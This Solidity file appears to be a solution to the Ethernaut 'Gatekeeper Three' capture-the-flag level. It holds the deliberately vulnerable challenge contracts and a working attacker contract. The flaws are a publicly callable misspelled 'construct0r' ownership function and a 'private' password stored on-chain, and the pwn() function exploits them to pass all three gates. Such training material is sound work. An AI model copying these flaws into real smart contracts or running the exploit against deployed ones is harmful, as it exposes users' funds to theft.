// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}

contract GatekeeperThreeHacker {
    GatekeeperThree private gt;
    
    constructor(address _gtAddress) {
        gt = GatekeeperThree(payable(_gtAddress));
    }

    function pwn(uint password) payable external {
        require(msg.value > 0.001 ether, "Insufficent ether");
        gt.construct0r();//set GatekeeperThreeHacker as gt.owner 
        gt.getAllowance(password); //set allow_enterance to true
        address(gt).call{value: msg.value}("");
        gt.enter();
        require(gt.entrant() == tx.origin, "Pwn failed");
    }
}